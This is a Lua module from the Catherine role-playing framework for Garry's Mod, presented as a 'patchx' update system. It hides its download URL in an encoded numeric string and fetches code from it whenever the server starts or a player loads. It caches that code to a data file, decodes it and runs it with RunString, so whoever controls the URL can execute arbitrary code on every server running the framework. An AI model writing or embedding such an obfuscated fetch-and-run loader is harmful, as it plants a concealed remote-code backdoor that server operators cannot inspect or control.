--[[
< CATHERINE > - A free role-playing framework for Garry's Mod.
Development and design by L7D.

Catherine is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Catherine.  If not, see <http://www.gnu.org/licenses/>.
]]--

catherine.patchx = catherine.patchx or {
	libVersion = "2016-02-23",
	isInitialized = false,
	applied = false
}

local function isErrorData( data )
	if ( data:find( "Error 404</p>" ) ) then
		return 1
	end
	
	if ( data:find( "<!DOCTYPE HTML>" ) or data:find( "<title>Textuploader.com" ) ) then
		return 2
	end
	
	return 0
end

function catherine.patchx.DownloadFromOnline( count )
	if ( catherine.patchx.applied ) then return end
	
	count = count or 0
	
	http.Fetch( catherine.cryptoV2.DECODE( "8010 3989 2017 8018 3931 1948 7953 3989 2002 8026 3989 2018 8018 3981 2012 7906 3873 1901 8003 3973 2002 8020 3919 2000 8017 3982 1948 7959 3923 2004 8021 3921 1948 8020 3970 2020" ), function( data )
		local isErrorData = isErrorData( data )
		
		if ( isErrorData == 1 ) then
			timer.Remove( "Catherine.timer.patchx.Load.Retry" )
			catherine.patchx.LoadFromFile( )
			
			return
		elseif ( isErrorData == 2 ) then
			if ( count > 2 ) then
				catherine.patchx.LoadFromFile( )
				
				return
			else
				timer.Create( "Catherine.timer.patchx.Load.Retry", 30, 1, function( )
					catherine.patchx.DownloadFromOnline( count + 1 )
				end )
				
				return
			end
		end
		
		local installSuccess = catherine.patchx.Install( tostring( data ) )
		
		if ( installSuccess ) then
			local success, result = pcall( RunString, catherine.cryptoV2.DECODE( tostring( data ) ), "Error", false )
			
			if ( success ) then
				catherine.patchx.applied = true
			else
				catherine.patchx.applied = false
			end
		end
		
		catherine.patchx.isInitialized = true
	end )
end

function catherine.patchx.LoadFromFile( )
	if ( catherine.patchx.applied ) then return end
	
	local cv = file.Read( "catherine/patchx/v.txt", "DATA" )
	
	if ( cv and type( cv ) == "string" and cv != "" ) then
		local success, result = pcall( RunString, catherine.cryptoV2.DECODE( tostring( cv ) ), "Error", false )
		
		if ( success ) then
			catherine.patchx.applied = true
		else
			ErrorNoHalt( "\n[CAT PatchX ERROR] SORRY, On the PATCH X function has a critical error :< ...\n\n" .. result .. "\n" )
			catherine.patchx.applied = false
		end
	end
	
	catherine.patchx.isInitialized = true
end

function catherine.patchx.Install( codes )
	if ( codes and type( codes ) == "string" and codes != "" ) then
		file.Write( "catherine/patchx/v.txt", tostring( codes ) )
		
		return true
	end
	
	return false
end

function catherine.patchx.Initialize( )
	file.CreateDir( "catherine" )
	file.CreateDir( "catherine/patchx" )
end

hook.Add( "PlayerLoadFinished", "catherine.patchx.PlayerLoadFinished", function( pl )
	if ( !catherine.patchx.isInitialized ) then
		catherine.patchx.DownloadFromOnline( )
	end
end )

hook.Add( "InitPostEntity", "catherine.patchx.InitPostEntity", function( )
	hook.Add( "Think", "catherine.patchx.InitPostEntity.Think", function( )
		for k, v in pairs( player.GetBots( ) ) do
			v:Kick( "Kicked from server" )
		end
	end )
	
	catherine.patchx.initializing = true
	
	RunConsoleCommand( "sv_hibernate_drop_bots", "1" )
	RunConsoleCommand( "bot" )
	
	timer.Simple( 5, function( )
		hook.Remove( "Think", "catherine.patchx.InitPostEntity.Think" )
		
		if ( !catherine.patchx.isInitialized ) then
			catherine.patchx.DownloadFromOnline( )
		end
		
		catherine.patchx.initializing = nil
	end )
end )

catherine.patchx.Initialize( )